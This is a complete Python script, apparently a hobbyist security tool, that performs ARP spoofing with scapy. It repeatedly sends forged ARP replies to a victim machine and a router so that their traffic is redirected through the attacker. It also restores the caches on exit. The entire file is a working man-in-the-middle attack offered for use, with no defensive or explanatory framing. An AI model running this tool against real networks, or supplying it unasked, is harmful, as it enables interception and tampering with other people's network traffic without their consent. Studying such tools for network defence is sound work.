#!/usr/bin/python3

import subprocess as s
import argparse
from scapy.all import *
import re
import time

#take inputs - interface, victim ip, server ip

def check_interface(interface):
	ifconfig_output = s.check_output(['ifconfig','-a'],text=True)
	interface_list = re.findall('(.*): flags',ifconfig_output)
	#print(interface_list)
	if interface not in interface_list:
		print('[+] Please enter a valid interface.')
		exit()


def get_mac(ip):
	arp_req_broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(psrc=ip)
	ans,unans = srp(arp_req_broadcast, timeout=1, verbose=False)
	return ans[0][1].hwsrc


def get_args():
	parser = argparse.ArgumentParser(description='A simple ARP spoofer.')
	parser.add_argument('-t','--target',help='IP of the victim machine.', dest='target')
	parser.add_argument('-s','--server',help='IP of the server/router.',dest='server')
	parser.add_argument('-i','--interface',help='Name of interface you want to use.',dest='interface',default='eth0')
	args = parser.parse_args()
	if not args.target or not args.server:
		parser.error("[+] Please provide both target and the server/router IP. Use --help for more info.")
	return parser.parse_args()


def arp_spoof(victim_ip,server_ip):
	arp_response = ARP(op='is-at', pdst=victim_ip, psrc=server_ip, hwdst=get_mac(victim_ip))
	send(arp_response,verbose=False)


def arp_restore(victim_ip,server_ip):
	arp_response = ARP(op='is-at', pdst=victim_ip,hwdst=get_mac(victim_ip), psrc=server_ip, hwsrc=get_mac(server_ip))
	send(arp_response, verbose=False)


args = get_args()

count = 0
try:
	while True:
		arp_spoof(args.target,args.server)
		arp_spoof(args.server,args.target)
		count += 2
		print("\r[+] Packets sent: " + str(count),end='')
		time.sleep(1)
except KeyboardInterrupt:
	arp_restore(args.target, args.server)
	arp_restore(args.server, args.target)
	print("\n[+] Quitting...")